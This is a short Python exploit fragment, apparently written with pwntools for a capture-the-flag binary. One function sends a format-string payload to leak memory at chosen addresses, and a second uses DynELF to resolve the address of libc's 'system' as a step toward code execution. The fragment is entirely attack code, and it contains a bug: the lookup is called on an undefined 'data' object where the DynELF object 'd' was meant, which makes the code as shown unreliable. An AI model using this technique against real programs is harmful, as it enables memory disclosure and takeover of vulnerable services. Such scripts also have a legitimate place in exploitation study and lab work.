def leak_func(addr):
	p.recvline()
	payload = "%9$s.AAA" + p32(addr)
	p.sendline(payload)
	data = p.recvuntil(".AAA")[:-4] + "\x00"

	log.info("leaking: 0x%x -> %s" % (addr, (data or '').encode('hex')))
	return data

def leak():
	global system_addr
	d = DynELF(leak_func, 0x08048490)			# Entry point address
	system_addr = data.lookup('system', 'libc')
	log.info("system address: 0x%x" % system_addr)
